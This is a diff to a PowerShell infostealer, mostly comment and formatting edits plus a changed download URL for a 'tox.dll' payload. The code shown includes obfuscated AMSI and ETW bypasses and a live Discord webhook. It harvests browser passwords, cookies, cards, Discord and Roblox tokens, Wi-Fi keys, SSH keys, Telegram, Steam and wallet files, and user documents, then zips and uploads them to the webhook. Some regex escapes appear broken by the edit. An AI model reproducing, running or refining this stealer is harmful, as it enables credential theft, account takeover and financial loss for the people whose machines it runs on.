@@ -2,7 +2,7 @@ $ErrorActionPreference = "SilentlyContinue"
 try{$n2=[string]::Join("",@([char]85,[char]116,[char]105,[char]108,[char]115));$n3=[string]::Join("",@([char]97,[char]109,[char]115,[char]105,[char]67,[char]111,[char]110,[char]116,[char]101,[char]120,[char]116));$t=[Ref].Assembly.GetTypes()|Where-Object{$_.Name-like"*$n2*"};$f=$t.GetFields("NonPublic,Static")|Where-Object{$_.Name-like"*$n3*"};[Runtime.InteropServices.Marshal]::WriteInt32($f.GetValue($null),0x41424344)}catch{}
 try{$ep=[string]::Join("",@([char]101,[char]116,[char]119,[char]80,[char]114,[char]111,[char]118,[char]105,[char]100,[char]101,[char]114));$me=[string]::Join("",@([char]109,[char]95,[char]101,[char]110,[char]97,[char]98,[char]108,[char]101,[char]100));$pt=[string]::Join("",@([char]80,[char]83,[char]69,[char]116,[char]119,[char]76,[char]111,[char]103,[char]80,[char]114,[char]111,[char]118,[char]105,[char]100,[char]101,[char]114));$at=[string]::Join("",@([char]84,[char]114,[char]97,[char]99,[char]105,[char]110,[char]103));$ns="System.Management.Automation.$at.$pt";$p2=[System.Reflection.Assembly]::GetAssembly([PSObject]).GetType($ns);$q=$p2.GetField($ep,"NonPublic,Static").GetValue($null);$q.GetType().GetField($me,"NonPublic,Instance").SetValue($q,0)}catch{}
 $wh="https://discord.com/api/webhooks/1558012203834155069/_c1lSxZkFXxLCi7_-D09InyzmdNL5Mdkxk8tPHCD0KemC70Bx5E44JmVjciciV3H94PX"
-$toxUrl="https://raw.githubusercontent.com/kurzslsklol/shishyboi/main/tox.dat"
+$toxUrl="https://cdn.stoplag.org/tox.dll"
 $hostname=$env:COMPUTERNAME;$username=$env:USERNAME
 $os=(Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption;if(-not $os){$os=$env:OS}
 $arch=$env:PROCESSOR_ARCHITECTURE
@@ -12,7 +12,7 @@ try{$geo=(irm "http://ip-api.com/json");$ip=$geo.query;$country=$geo.country;$ci
 $uid=[Guid]::NewGuid().ToString("N").Substring(0,8)
 $tmp=[IO.Path]::Combine($env:TEMP,"tmp_$uid");New-Item -ItemType Directory -Path $tmp -Force | Out-Null
 
-# ── VSS shadow copy ────────────────────────────────────────────────────────
+# ── VSS shadow copy ────────────────────────────────────────────────
 $shadowPath=$null
 try{
   $vssClass=[wmiclass]"Win32_ShadowCopy"
@@ -33,7 +33,7 @@ function Noob-ReadLocked($path){
     }catch{}
   }
   try{$fs=[System.IO.File]::Open($path,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite);$ms=New-Object System.IO.MemoryStream;$fs.CopyTo($ms);$fs.Dispose();$b=$ms.ToArray();if($b.Length -gt 0){return $b}}catch{}
-  try{$cp=[IO.Path]::Combine($tmp,"rl_$([Guid]::NewGuid().ToString('N').Substring(0,6))_$(Split-Path $path -Leaf)");$si=New-Object System.Diagnostics.ProcessStartInfo("robocopy.exe","/B /NP /NJS /NJH /R:0 /W:0 `"$(Split-Path $path)`" `"$tmp`" `"$(Split-Path $path -Leaf)`"");$si.WindowStyle="Hidden";$si.CreateNoWindow=$true;$si.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($si);$p.WaitForExit(4000);$rp=[IO.Path]::Combine($tmp,$(Split-Path $path -Leaf));if(Test-Path $rp){$b=[IO.File]::ReadAllBytes($rp);Remove-Item $rp -EA 0;if($b.Length -gt 0){return $b}}}catch{}
+  try{$cp=[IO.Path]::Combine($tmp,"rl_$([Guid]::NewGuid().ToString("N").Substring(0,6))_$(Split-Path $path -Leaf)");$si=New-Object System.Diagnostics.ProcessStartInfo("robocopy.exe","/B /NP /NJS /NJH /R:0 /W:0 `"$(Split-Path $path)`" `"$tmp`" `"$(Split-Path $path -Leaf)`"");$si.WindowStyle="Hidden";$si.CreateNoWindow=$true;$si.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($si);$p.WaitForExit(4000);$rp=[IO.Path]::Combine($tmp,$(Split-Path $path -Leaf));if(Test-Path $rp){$b=[IO.File]::ReadAllBytes($rp);Remove-Item $rp -EA 0;if($b.Length -gt 0){return $b}}}catch{}
   return $null
 }
 function Noob-GetMasterKey($lsPath){
@@ -44,7 +44,7 @@ function Noob-SendZip($zwh,$zpath,$zname,$zmsg){
     $zb=[IO.File]::ReadAllBytes($zpath)
     if($zb.Length -gt 9MB){Write-Host "zip too large: $($zb.Length)";return}
     $zbnd="B"+[Guid]::NewGuid().ToString("N")
-    $zmj=[Text.Encoding]::UTF8.GetBytes('{"content":"'+$zmsg+'"}')
+    $zmj=[Text.Encoding]::UTF8.GetBytes('{"content":"'+$zmsg+'"}') 
     $zfh1=[Text.Encoding]::UTF8.GetBytes("--$zbnd`r`nContent-Disposition: form-data; name="+[char]34+"payload_json"+[char]34+"`r`nContent-Type: application/json`r`n`r`n")
     $zfh2=[Text.Encoding]::UTF8.GetBytes("`r`n--$zbnd`r`nContent-Disposition: form-data; name="+[char]34+"file"+[char]34+"; filename="+[char]34+"$zname"+[char]34+"`r`nContent-Type: application/zip`r`n`r`n")
     $zfh3=[Text.Encoding]::UTF8.GetBytes("`r`n--$zbnd--`r`n")
@@ -64,7 +64,7 @@ function Noob-SendEmbed($zwh,$zembed){
   }catch{}
 }
 
-# ── browser profiles (chromium) ────────────────────────────────────────────
+# ── browser profiles (chromium) ────────────────────────────────────
 $profiles=@{
   "Chrome"="$env:LOCALAPPDATA\Google\Chrome\User Data"
   "Brave"="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
@@ -77,7 +77,7 @@ $profiles=@{
   "Epic"="$env:LOCALAPPDATA\Epic Privacy Browser\User Data"
 }
 
-# ── memscan + sqlite helper ─────────────────────────────────────────────────
+# ── memscan + sqlite helper ─────────────────────────────────────────
 $memCode=@'
 using System;
 using System.Runtime.InteropServices;
@@ -419,7 +419,7 @@ public static class V20Key {
 '@
 try{Add-Type -TypeDefinition $memCode -Language CSharp}catch{}
 
-# ── discord tokens – pass 1: LDB file scan ──────────────────────────────────
+# ── discord tokens — pass 1: LDB file scan ─────────────────────────
 $lat1=[Text.Encoding]::GetEncoding(28591)
 $tokenRx=[regex]"(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24,28}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{38})"
 $appBases=@{
@@ -444,7 +444,7 @@ foreach($appName in $appBases.Keys){
 }
 $allTokens=$allTokens|Select-Object -Unique
 
-# ── discord tokens – pass 2: process memory scan ────────────────────────────
+# ── discord tokens — pass 2: process memory scan ───────────────────
 try{
   $discPat="(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{17,28}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,})"
   foreach($dp in (Get-Process -Name "Discord","DiscordCanary","DiscordPTB","Lightcord" -EA SilentlyContinue)){
@@ -453,7 +453,7 @@ try{
 }catch{}
 $allTokens=$allTokens|Select-Object -Unique
 
-# ── discord API validation ────────────────────────────────────────────────────
+# ── discord API validation ──────────────────────────────────────────
 $discordToken=$null
 $dUser="unknown";$dDisplay="unknown";$dEmail="none";$dPhone="none";$dMfa="No";$dNitro="None";$dAvatar=$null
 foreach($tok in $allTokens){
@@ -480,12 +480,12 @@ $reconFields.Add(@{name=":computer: System";value="``Host:`` $hostname`n``User:`
 $reconFields.Add(@{name=":globe_with_meridians: Network";value="``IP:`` $ip`n``Country:`` $country`n``City:`` $city`n``ISP:`` $isp";inline=$true})
 $reconFields.Add(@{name=":purple_circle: Discord";value="``User:`` $dUser`n``Display:`` $dDisplay`n``Email:`` $dEmail`n``Phone:`` $dPhone`n``MFA:`` $dMfa`n``Nitro:`` $dNitro";inline=$false})
 $reconFields.Add(@{name=":key: Token";value="``$tokenVal``";inline=$false})
-  $reconEmbed=@{title=":zap: Recon – $hostname";color=0xE67E22;fields=$reconFields.ToArray();footer=@{text="stoplag.org"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")}
+  $reconEmbed=@{title=":zap: Recon — $hostname";color=0xE67E22;fields=$reconFields.ToArray();footer=@{text="stoplag.org"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")}
 
-# ── screenshot ──────────────────────────────────────────────────────────────
+# ── screenshot ─────────────────────────────────────────────────────
 try{Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);$gfx=[System.Drawing.Graphics]::FromImage($bmp);$gfx.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size);$bmp.Save([IO.Path]::Combine($tmp,"sc.png"),[System.Drawing.Imaging.ImageFormat]::Png);$gfx.Dispose();$bmp.Dispose()}catch{}
 
-# ── chunk system ────────────────────────────────────────────────────────────
+# ── chunk system ───────────────────────────────────────────────────
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $chunkIdx=0;$chunkDir=[IO.Path]::Combine($tmp,"chunk_0");New-Item -ItemType Directory -Path $chunkDir -Force|Out-Null
 $chunkSize=0;$maxChunk=9MB
@@ -508,7 +508,7 @@ $chunkSize+=200
 # screenshot into chunk 0
 $scPath=[IO.Path]::Combine($tmp,"sc.png");if(Test-Path $scPath){$scb=[IO.File]::ReadAllBytes($scPath);Noob-AddToChunk $scb "sc.png"}
 
-# ── chromium browser DBs ─────────────────────────────────────────────────────
+# ── chromium browser DBs ───────────────────────────────────────────
 $cryptoExtIds=@("nkbihfbeogaeaoehlefnkodbefgpgknn","hnfanknocfeofbddgcijnmhnfnkdnaad","bfnaelmomeimhlpmgjnjophhpkkoljpa","aholpfdialjgjfhomihkjbmgjidlcdno","fhbohimaelbohpjbbldcngcnapndodjp","odbfpeeihdkbihmopkbjmoonfanlbfcl","mcohilncbfahbmgdjkbpemcciiolgcge","lgmpcpglpngdoalbgeoldeajfclnhafa","nanjmdknhkinifnkgdcggcfnhdaammmj","bhghoamapcdpbohphigoooaddinpkbai")
 foreach($bn in $profiles.Keys){
   $base=$profiles[$bn]
@@ -543,7 +543,7 @@ foreach($bn in $profiles.Keys){
   }
 }
 
-# ── decrypt helper ───────────────────────────────────────────────────────────
+# ── decrypt helper (before first use — passwords calls it) ────────
 function Noob-DecryptCookie($encBytes,$mk,$mkV20){
   try{
     if(-not $encBytes -or $encBytes.Length -lt 15){return $null}
@@ -563,7 +563,7 @@ function Noob-DecryptCookie($encBytes,$mk,$mkV20){
   }catch{return $null}
 }
 
-# ── passwords / autofill / cards ─────────────────────────────────────────────
+# ── passwords / autofill / cards (tox semantics) ──────────────────
 $pwCount=0;$pwV20=0;$pwV20Ok=0;$afCount=0;$ccCount=0
 foreach($bn in $profiles.Keys){
   $base=$profiles[$bn]
@@ -578,7 +578,7 @@ foreach($bn in $profiles.Keys){
     if(Test-Path $ld){
       $ldBytes=Noob-ReadLocked $ld
       if($ldBytes -and $ldBytes.Length -ge 100){
-        $ldTmp=[IO.Path]::Combine($tmp,"ld_$([Guid]::NewGuid().ToString('N').Substring(0,6)).db")
+        $ldTmp=[IO.Path]::Combine($tmp,"ld_$([Guid]::NewGuid().ToString("N").Substring(0,6)).db")
         [IO.File]::WriteAllBytes($ldTmp,$ldBytes)
         $walTmp=$ldTmp+"-wal";$walSrc=$ld+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
         try{
@@ -604,7 +604,7 @@ foreach($bn in $profiles.Keys){
     if(Test-Path $wd){
       $wdBytes=Noob-ReadLocked $wd
       if($wdBytes -and $wdBytes.Length -ge 100){
-        $wdTmp=[IO.Path]::Combine($tmp,"wd_$([Guid]::NewGuid().ToString('N').Substring(0,6)).db")
+        $wdTmp=[IO.Path]::Combine($tmp,"wd_$([Guid]::NewGuid().ToString("N").Substring(0,6)).db")
         [IO.File]::WriteAllBytes($wdTmp,$wdBytes)
         $walTmp2=$wdTmp+"-wal";$walSrc2=$wd+"-wal";if(Test-Path $walSrc2){$wb2=Noob-ReadLocked $walSrc2;if($wb2){[IO.File]::WriteAllBytes($walTmp2,$wb2)}}
         try{
@@ -637,7 +637,7 @@ foreach($bn in $profiles.Keys){
   }
 }
 
-# ── full cookie dump ─────────────────────────────────────────────────────────
+# ── full cookie dump (tox Cookie/CookieNetwork mirror) ───────────
 $ckDump=0
 foreach($bn in $profiles.Keys){
   $base=$profiles[$bn]
@@ -653,7 +653,7 @@ foreach($bn in $profiles.Keys){
       if(-not(Test-Path $ckPath)){continue}
       $ckBytes=Noob-ReadLocked $ckPath
       if(-not $ckBytes -or $ckBytes.Length -lt 100){continue}
-      $ckTmp=[IO.Path]::Combine($tmp,"ckd_$([Guid]::NewGuid().ToString('N').Substring(0,6)).db")
+      $ckTmp=[IO.Path]::Combine($tmp,"ckd_$([Guid]::NewGuid().ToString("N").Substring(0,6)).db")
       [IO.File]::WriteAllBytes($ckTmp,$ckBytes)
       $walTmp=$ckTmp+"-wal";$walSrc=$ckPath+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
       try{
@@ -680,7 +680,7 @@ foreach($bn in $profiles.Keys){
   }
 }
 
-# ── wifi keys ────────────────────────────────────────────────────────────────
+# ── wifi keys (tox WifiKeys mirror) ───────────────────────────────
 $wifiCount=0
 try{
   $wpSb=New-Object Text.StringBuilder
@@ -689,16 +689,16 @@ try{
   foreach($wp in $wpList){
     if(-not $wp){continue}
     $info=(& netsh wlan show profile name="$wp" key=clear 2>$null|Out-String)
-    $kc=if($info-match "Key Content\s+:\s+(\S+)"){$Matches[1]}else{"Not found"}
-    $au=if($info-match "Authentication\s+:\s+(\w+)"){$Matches[1]}else{"Not found"}
-    $ci=if($info-match "Cipher\s+:\s+(\w+)"){$Matches[1]}else{"Not found"}
+    $kc=if($info-match "Key Contents+:s+(S+)"){$Matches[1]}else{"Not found"}
+    $au=if($info-match "Authentications+:s+(w+)"){$Matches[1]}else{"Not found"}
+    $ci=if($info-match "Ciphers+:s+(w+)"){$Matches[1]}else{"Not found"}
     [void]$wpSb.AppendLine("$wp`t$kc`t$au`t$ci")
     $wifiCount++
   }
   if($wifiCount-gt 0){Noob-AddToChunk ([Text.Encoding]::UTF8.GetBytes($wpSb.ToString())) "WifiKeys.txt"}
 }catch{}
 
-# ── file grabber ─────────────────────────────────────────────────────────────
+# ── file grabber (tox FileGrabberEnhanced mirror) ──────────────────
 $fgCount=0;$fgBytes=0;$fgCap=10000000
 $fgExt=@(".ovpn",".txt",".zip",".7z",".rar",".pdf",".rtf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".indd",".json",".mafile",".db",".db3",".db4",".kdb",".kdbx",".sql",".sqlite",".mdf",".mdb",".dsk",".dbf",".wallet",".ini",".c",".cs",".cpp",".asm",".sh",".py",".pyw",".html",".css",".php",".go",".js",".rb",".pl",".swift",".java",".kt",".kts",".ino",".jpg",".jpeg",".png",".bmp",".psd",".svg",".ai",".keys")
 $fgRoots=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads")
@@ -715,7 +715,7 @@ foreach($fr in $fgRoots){
   }
 }
 
-# ── firefox ──────────────────────────────────────────────────────────────────
+# ── firefox ────────────────────────────────────────────────────────
 $ffBase="$env:APPDATA\Mozilla\Firefox\Profiles"
 if(Test-Path $ffBase){
   Get-ChildItem $ffBase -Directory -EA SilentlyContinue|ForEach-Object{
@@ -727,7 +727,7 @@ if(Test-Path $ffBase){
   }
 }
 
-# ── telegram tdata ───────────────────────────────────────────────────────────
+# ── telegram tdata ─────────────────────────────────────────────────
 $tgPath="$env:APPDATA\Telegram Desktop\tdata"
 if(Test-Path $tgPath){
   Get-ChildItem $tgPath -File -EA SilentlyContinue|Where-Object{$_.Length -lt 5MB -and $_.Name -notmatch "\.(png|jpg|gif|bmp|ico)$"}|ForEach-Object{
@@ -735,7 +735,7 @@ if(Test-Path $tgPath){
   }
 }
 
-# ── steam ────────────────────────────────────────────────────────────────────
+# ── steam ──────────────────────────────────────────────────────────
 $steamPath="C:\Program Files (x86)\Steam"
 if(-not(Test-Path $steamPath)){$steamPath="$env:PROGRAMFILES\Steam"}
 if(Test-Path $steamPath){
@@ -746,7 +746,7 @@ if(Test-Path $steamPath){
   $scfg="$steamPath\config\config.vdf";if(Test-Path $scfg){$rb=Noob-ReadLocked $scfg;if($rb){Noob-AddToChunk $rb "Steam_config.vdf"}}
 }
 
-# ── minecraft ────────────────────────────────────────────────────────────────
+# ── minecraft ──────────────────────────────────────────────────────
 $mcBase="$env:APPDATA\.minecraft"
 if(Test-Path $mcBase){
   foreach($fn in @("launcher_profiles.json","usercache.json")){
@@ -760,7 +760,7 @@ foreach($launcher in @("$env:APPDATA\FeatherClient","$env:APPDATA\Badlion Client
   }
 }
 
-# ── crypto wallets ───────────────────────────────────────────────────────────
+# ── crypto desktop wallets ─────────────────────────────────────────
 $wallets=@{
   "Exodus"="$env:APPDATA\Exodus\exodus.wallet"
   "Electrum"="$env:APPDATA\Electrum\wallets"
@@ -777,7 +777,7 @@ foreach($wname in $wallets.Keys){
   }
 }
 
-# ── SSH keys ─────────────────────────────────────────────────────────────────
+# ── SSH keys ───────────────────────────────────────────────────────
 $sshPath="$env:USERPROFILE\.ssh"
 if(Test-Path $sshPath){
   Get-ChildItem $sshPath -File -EA SilentlyContinue|ForEach-Object{
@@ -785,7 +785,7 @@ if(Test-Path $sshPath){
   }
 }
 
-# ── FileZilla ────────────────────────────────────────────────────────────────
+# ── FileZilla ──────────────────────────────────────────────────────
 $fzBase="$env:APPDATA\FileZilla"
 if(Test-Path $fzBase){
   foreach($fn in @("recentservers.xml","sitemanager.xml")){
@@ -793,7 +793,7 @@ if(Test-Path $fzBase){
   }
 }
 
-# ── credential files ─────────────────────────────────────────────────────────
+# ── env/config credential files ────────────────────────────────────
 $credRx=[regex]"(?i)(password|passwd|secret|api.?key|token|seed|mnemonic|private.?key)"
 $scanDirs=@($env:USERPROFILE,$env:USERPROFILE+"\Desktop",$env:USERPROFILE+"\Documents",$env:USERPROFILE+"\Downloads")
 foreach($sd in $scanDirs){
@@ -803,7 +803,7 @@ foreach($sd in $scanDirs){
   }
 }
 
-# ── cleanup VSS ──────────────────────────────────────────────────────────────
+# ── cleanup VSS ────────────────────────────────────────────────────
 try{if($shadow){$shadow.Delete()}}catch{}
 
 # ── roblox cookie ────────────────────────────────────────────────────────────
@@ -822,13 +822,15 @@ function Noob-AddCookie($c){
 }
 try{
   Add-Type -AssemblyName System.Security
-  # 1) RobloxCookies.dat
+  # 1) RobloxCookies.dat — DPAPI blob, cleanest path
   $rbxDat="$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat"
   if(Test-Path $rbxDat){
     try{
       $rawDat=Noob-ReadLocked $rbxDat
       if($rawDat){
+        # try raw DPAPI first
         try{$plain=[Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($rawDat,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser));$rxM=[regex]::Match($plain,"_\|WARNING\S+");if($rxM.Success){Noob-AddCookie $rxM.Value}}catch{}
+        # try JSON wrapper — {"cookie":"<b64>","..."}
         if($rbxCandidates.Count -eq 0){
           try{
             $j=[Text.Encoding]::UTF8.GetString($rawDat)|ConvertFrom-Json
@@ -846,7 +848,7 @@ try{
   foreach($rp in $regPaths){
     try{$rv=Get-ItemProperty -Path $rp -EA Stop;$rv.PSObject.Properties|ForEach-Object{$v=[string]$_.Value;if($v -match "_\|WARNING"){Noob-AddCookie $v}}}catch{}
   }
-  # 3) App LDB
+  # 3) Roblox app LDB dirs
   if($rbxCandidates.Count -eq 0){
   $sq=[char]39;$dq=[char]34;$rxPat="_\|WARNING[^"+$dq+$sq+"\s]{20,}"
   $rbxAppDirs=@("$env:LOCALAPPDATA\Roblox\LocalStorage\leveldb","$env:APPDATA\Roblox\LocalStorage\leveldb","$env:LOCALAPPDATA\Roblox","$env:APPDATA\Roblox")
@@ -859,7 +861,7 @@ try{
     }
   }
   }
-  # 4) Browser Cookies
+  # 4) Browser Cookies — winsqlite3 exact query, ALL profiles
   foreach($bn in $profiles.Keys){
     $base=$profiles[$bn]
     $mk=Noob-GetMasterKey "$base\Local State"
@@ -872,11 +874,15 @@ try{
         if(-not(Test-Path $ckPath)){continue}
         $ckBytes=Noob-ReadLocked $ckPath
         if(-not $ckBytes -or $ckBytes.Length -lt 100){continue}
-        $ckTmp=[IO.Path]::Combine($tmp,"ck_$([Guid]::NewGuid().ToString('N').Substring(0,6)).db")
+        $ckTmp=[IO.Path]::Combine($tmp,"ck_$([Guid]::NewGuid().ToString("N").Substring(0,6)).db")
         [IO.File]::WriteAllBytes($ckTmp,$ckBytes)
         $walTmp=$ckTmp+"-wal";$walSrc=$ckPath+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
         try{
-          $rbxSql="SELECT encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com%' AND name='.ROBLOSECURITY' LIMIT 1"
+          $rbxSql="SELECT encrypted_value FROM cookies WHERE host_key LIKE 
+'%.roblox.com%'
+ AND name=
+'.ROBLOSECURITY'
+ LIMIT 1"
           $blob=[SQLiteHelper]::GetBlob($ckTmp,$rbxSql)
           if($blob -and $blob.Length -gt 15){
             $plain=Noob-DecryptCookie $blob $mk
@@ -888,7 +894,7 @@ try{
       }
     }
   }
-  # 5) Process memory
+  # 5) Process memory — all processes
   if($rbxCandidates.Count -eq 0){
     try{
       $rbxMemPat="_\|WARNING[^\s\x00-\x1f]{100,}"
@@ -945,7 +951,7 @@ try{
     $toz=[System.IO.Compression.ZipFile]::OpenRead($toxZp)
     foreach($ze in $toz.Entries){
       if($ze.Length -le 0 -or $ze.Length -gt $maxChunk){continue}
-      try{$zeS=$ze.Open();$zeM=New-Object IO.MemoryStream;$zeS.CopyTo($zeM);$zeS.Dispose();Noob-AddToChunk $zeM.ToArray() ("tox_"+($ze.FullName -replace "[<>:|?*\\\\/]","_"));$toxEntries++}catch{}
+      try{$zeS=$ze.Open();$zeM=New-Object IO.MemoryStream;$zeS.CopyTo($zeM);$zeS.Dispose();Noob-AddToChunk $zeM.ToArray() ("tox_"+($ze.FullName -replace "[<>:|?*\\/]","_"));$toxEntries++}catch{}
     }
     $toz.Dispose()
     Remove-Item $toxZp -Force -EA 0
@@ -953,7 +959,7 @@ try{
   Remove-Item $toxDll -Force -EA 0
 }catch{$toxErr="["+$toxStage+"] "+$_.Exception.Message}
 
-# ── send main embed ──────────────────────────────────────────────────────────
+# ── send main embed ────────────────────────────────────────────────
 $tokenVal=if($discordToken){$discordToken}else{"none"}
 $totalChunks=$chunkIdx+1
 $fields=[System.Collections.Generic.List[hashtable]]::new()
@@ -967,18 +973,18 @@ $fields.Add(@{name=":package: Zips";value="Sending $totalChunks zip(s)";inline=$
 $fields.Add(@{name=":shield: ToxSteal";value="$toxEntries files$(if($toxErr){" | "+$toxErr.Substring(0,[Math]::Min(300,$toxErr.Length))})";inline=$true})
 $fields.Add(@{name=":key: Steal";value="$pwCount passwords, $pwV20 v20($pwV20Ok ok), $afCount autofill, $ccCount cards, $ckDump cookies, $wifiCount wifi";inline=$true})
 $fields.Add(@{name=":open_file_folder: Files";value="$fgCount files ($fgBytes B)";inline=$true})
-$embed=@{title=":satellite: New Hit – $hostname";color=0xE74C3C;fields=$fields.ToArray();footer=@{text="stoplag.org"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")}
+$embed=@{title=":satellite: New Hit — $hostname";color=0xE74C3C;fields=$fields.ToArray();footer=@{text="stoplag.org"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")}
 if($dAvatar){$embed.thumbnail=@{url=$dAvatar}}
 Noob-SendEmbed $wh $embed
 
-# ── zip and send chunks ──────────────────────────────────────────────────────
+# ── zip and send each chunk ─────────────────────────────────────────
 for($ci=0;$ci -le $chunkIdx;$ci++){
   $cd=[IO.Path]::Combine($tmp,"chunk_$ci")
   $zp=[IO.Path]::Combine($tmp,"${hostname}_${uid}_part${ci}.zip")
   try{[System.IO.Compression.ZipFile]::CreateFromDirectory($cd,$zp)}catch{continue}
   if(Test-Path $zp){
     $zsz=[Math]::Round((Get-Item $zp).Length/1MB,1)
-    Noob-SendZip $wh $zp "${hostname}_part${ci}.zip" "part $($ci+1) of $totalChunks – $hostname ($zsz MB)"
+    Noob-SendZip $wh $zp "${hostname}_part${ci}.zip" "part $($ci+1) of $totalChunks — $hostname ($zsz MB)"
     Remove-Item $zp -Force -EA 0
   }
 }
